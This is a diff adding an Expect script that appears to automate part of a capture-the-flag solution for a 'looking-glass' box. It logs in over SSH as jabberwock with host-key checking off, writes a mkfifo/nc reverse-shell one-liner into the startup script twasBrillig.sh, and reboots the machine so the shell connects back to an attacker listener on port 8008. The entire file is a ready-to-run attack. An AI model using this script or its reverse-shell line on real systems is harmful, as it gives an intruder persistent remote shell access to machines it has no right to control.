@@ -1,0 +1,42 @@
+#!/usr/bin/expect -f
+#
+# This Expect script was assisted with generation by autoexpect
+# Expect and autoexpect were both written by Don Libes, NIST.
+
+set force_conservative 0  ;# set to 1 to force conservative mode even if
+			  ;# script wasn't run conservatively originally
+if {$force_conservative} {
+	set send_slow {1 .1}
+	proc send {ignore arg} {
+		sleep .1
+		exp_send -s -- $arg
+	}
+}
+
+set timeout -1
+set TARGET [lindex $argv 0]
+set LOCAL [lindex $argv 1]
+set PASSWORD [lindex $argv 2]
+
+puts "-------------------------------------------"
+puts "MAKE SURE YOU HAVE ANOTHER TERMINAL RUNNING"
+puts "nc -nlvp 8008"
+puts "TO CATCH THE REVERSE SHELL"
+puts "-------------------------------------------"
+
+spawn ssh -q -t -o StrictHostKeyChecking=no jabberwock@$TARGET bash --noprofile
+match_max 100000
+
+expect "*jabberwock*password*"
+send -- "$PASSWORD\r"
+
+expect "*jabberwock@looking-glass*"
+send -- "echo '#!/bin/bash' > twasBrillig.sh\r"
+
+expect "*jabberwock@looking-glass*"
+send -- "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LOCAL 8008 >/tmp/f' >> twasBrillig.sh\r"
+
+expect "*jabberwock@looking-glass*"
+send -- "sudo reboot\r"
+
+expect eof
